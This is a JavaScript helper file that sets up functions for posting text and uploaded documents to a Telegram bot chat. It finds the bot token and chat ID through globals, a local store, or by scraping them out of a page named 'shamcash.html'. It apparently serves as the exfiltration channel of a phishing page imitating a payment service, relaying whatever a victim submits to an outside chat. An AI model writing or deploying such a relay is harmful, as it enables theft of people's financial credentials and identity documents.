
// tg_bridge.js — unify tgSendMessage/tgSendDocument
(function(){
  if (window.tgSendMessage && window.tgSendDocument) return;
  function define(token, chat){
    if(!token || !chat) return false;
    var API = "https://api.telegram.org/bot"+token;
    window.tgSendMessage = async function(text){
      const r = await fetch(API + "/sendMessage", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: chat, text: text })
      });
      if(!r.ok) throw new Error("tg sendMessage failed");
      return r.json();
    };
    window.tgSendDocument = async function(file, caption){
      const fd = new FormData();
      fd.append("chat_id", chat);
      fd.append("document", file);
      if(caption) fd.append("caption", caption);
      const r = await fetch(API + "/sendDocument", { method:"POST", body: fd });
      if(!r.ok) throw new Error("tg sendDocument failed");
      return r.json();
    };
    return true;
  }
  try{
    if(define(window.LEVENT_TG_TOKEN, window.LEVENT_TG_CHAT_ID)) return;
  }catch(_){}
  // fallback to LS
  try{
    if(window.__LEV_TG_STORE__){
      var cfg = __LEV_TG_STORE__.load();
      if(cfg && define(cfg.token, cfg.chat)) return;
    }
  }catch(_){}
  // parse shamcash
  fetch("shamcash.html",{cache:"no-store"}).then(r=>r.ok?r.text():"").then(function(html){
    if(!html) return;
    var m1 = html.match(/(?:const|var|let)\s+BOT_TOKEN\s*=\s*['"]([^'"]+)['"]/);
    var m2 = html.match(/(?:const|var|let)\s+CHAT_ID\s*=\s*['"]([^'"]+)['"]/);
    if(m1 && m2){ define(m1[1], m2[1]); return; }
    var m3 = html.match(/https:\/\/api\.telegram\.org\/bot([A-Za-z0-9:_-]+)\//);
    var m4 = html.match(/chat_id\s*[:=]\s*['"](-?\d+)['"]/);
    if(m3 && m4){ define(m3[1], m4[1]); }
  }).catch(function(){});
})();
